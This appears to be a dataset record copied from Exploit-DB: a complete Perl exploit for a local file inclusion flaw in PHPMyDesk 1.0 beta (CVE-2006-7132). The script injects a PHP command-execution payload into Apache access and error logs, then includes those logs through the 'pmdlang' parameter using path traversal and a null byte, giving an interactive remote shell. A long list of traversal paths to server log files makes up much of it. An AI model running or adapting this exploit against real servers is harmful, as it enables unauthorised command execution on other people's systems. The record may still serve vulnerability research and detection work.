{
  "id": "2664",
  "title": "PHPMyDesk 1.0 Beta - &#039;viewticket.php&#039; Local File Inclusion",
  "cve": "CVE-2006-7132",
  "vuln_type": "path_traversal",
  "code": "#!/usr/bin/perl\r\n#\r\n# PHPMyDesk 1.0beta Remote Command Execution Exploit\r\n# linK : http://www.cynux.com/phpmydesk/\r\n#\r\n# (c)od3d and f0unded by Kw3[R]Ln from Romanian Security Team a.K.A http://RST-CREW.NET\r\n# Contact: ciriboflacs[AT]YaHOo.com or kw3rln@rst-crew.net\r\n#\r\n# File inclusion: www.site.com/<path>/viewticket.php?pmdlang=<local/remote file>\r\n#\r\n# Vurnerable code:\r\n#   in viewticket.php: include('pmd-config.php'); [..] include($lang_mod);\r\n#\r\n#   and in pmd-config.php is\r\n#\r\n#      if($pmdlang){\r\n#          $lang_mod = \"lang/\".$pmdlang.\".php\";\r\n#                  }\r\n#\r\n# Shoutz to [Oo], str0ke, th0r and all members of RST\r\n# PS: fuck CarcaBot ..another lame romanian guy =))\r\n\r\n\r\nuse IO::Socket;\r\nuse LWP::Simple;\r\n\r\n\r\n@apache=(\r\n\"../../../../../var/log/httpd/access_log\",\r\n\"../../../../../var/log/httpd/error_log\",\r\n\"../apache/logs/error.log\",\r\n\"../apache/logs/access.log\",\r\n\"../../apache/logs/error.log\",\r\n\"../../apache/logs/access.log\",\r\n\"../../../apache/logs/error.log\",\r\n\"../../../apache/logs/access.log\",\r\n\"../../../../apache/logs/error.log\",\r\n\"../../../../apache/logs/access.log\",\r\n\"../../../../../apache/logs/error.log\",\r\n\"../../../../../apache/logs/access.log\",\r\n\"../logs/error.log\",\r\n\"../logs/access.log\",\r\n\"../../logs/error.log\",\r\n\"../../logs/access.log\",\r\n\"../../../logs/error.log\",\r\n\"../../../logs/access.log\",\r\n\"../../../../logs/error.log\",\r\n\"../../../../logs/access.log\",\r\n\"../../../../../logs/error.log\",\r\n\"../../../../../logs/access.log\",\r\n\"../../../../../etc/httpd/logs/access_log\",\r\n\"../../../../../etc/httpd/logs/access.log\",\r\n\"../../../../../etc/httpd/logs/error_log\",\r\n\"../../../../../etc/httpd/logs/error.log\",\r\n\"../../.. /../../var/www/logs/access_log\",\r\n\"../../../../../var/www/logs/access.log\",\r\n\"../../../../../usr/local/apache/logs/access_log\",\r\n\"../../../../../usr/local/apache/logs/access.log\",\r\n\"../../../../../var/log/apache/access_log\",\r\n\"../../../../../var/log/apache/access.log\",\r\n\"../../../../../var/log/access_log\",\r\n\"../../../../../var/www/logs/error_log\",\r\n\"../../../../../var/www/logs/error.log\",\r\n\"../../../../../usr/local/apache/logs/error_log\",\r\n\"../../../../../usr/local/apache/logs/error.log\",\r\n\"../../../../../var/log/apache/error_log\",\r\n\"../../../../../var/log/apache/error.log\",\r\n\"../../../../../var/log/access_log\",\r\n\"../../../../../var/log/error_log\"\r\n);\r\n\r\nprint \"[RST] PHPMyDesk 1.0beta Remote Command Execution Exploit\\n\";\r\nprint \"[RST] need magic_quotes_gpc = off\\n\";\r\nprint \"[RST] c0ded by Kw3rLN from Romanian Security Team [ http://rst-crew.net ] \\n\\n\";\r\n\r\n\r\nif (@ARGV < 3)\r\n{\r\n    print \"[RST] Usage: PHPMyDesk.pl [host] [path] [apache_path]\\n\\n\";\r\n    print \"[RST] Apache Path: \\n\";\r\n    $i = 0;\r\n    while($apache[$i])\r\n    { print \"[$i] $apache[$i]\\n\";$i++;}\r\n    exit();\r\n}\r\n\r\n$host=$ARGV[0];\r\n$path=$ARGV[1];\r\n$apachepath=$ARGV[2];\r\n\r\nprint \"[RST] Injecting some code in log files...\\n\";\r\n$CODE=\"<?php ob_clean();system(\\$HTTP_COOKIE_VARS[cmd]);die;?>\";\r\n$socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$host\", PeerPort=>\"80\") or die \"[RST] Could not connect to host.\\n\\n\";\r\nprint $socket \"GET \".$path.$CODE.\" HTTP/1.1\\r\\n\";\r\nprint $socket \"User-Agent: \".$CODE.\"\\r\\n\";\r\nprint $socket \"Host: \".$host.\"\\r\\n\";\r\nprint $socket \"Connection: close\\r\\n\\r\\n\";\r\nclose($socket);\r\nprint \"[RST] Shell!! write q to exit !\\n\";\r\nprint \"[RST] IF not working try another apache path\\n\\n\";\r\n\r\nprint \"[shell] \";$cmd = <STDIN>;\r\n\r\nwhile($cmd !~ \"q\") {\r\n    $socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$host\", PeerPort=>\"80\") or die \"[RST] Could not connect to host.\\n\\n\";\r\n\r\n    print $socket \"GET \".$path.\"viewticket.php?pmdlang=\".$apache[$apachepath].\"%00&cmd=$cmd HTTP/1.1\\r\\n\";\r\n    print $socket \"Host: \".$host.\"\\r\\n\";\r\n    print $socket \"Accept: */*\\r\\n\";\r\n    print $socket \"Connection: close\\r\\n\\n\";\r\n\r\n    while ($raspuns = <$socket>)\r\n    {\r\n        print $raspuns;\r\n    }\r\n\r\n    print \"[shell] \";\r\n    $cmd = <STDIN>;\r\n}\r\n\r\n# milw0rm.com [2006-10-28]",
  "url": "https://www.exploit-db.com/exploits/2664"
}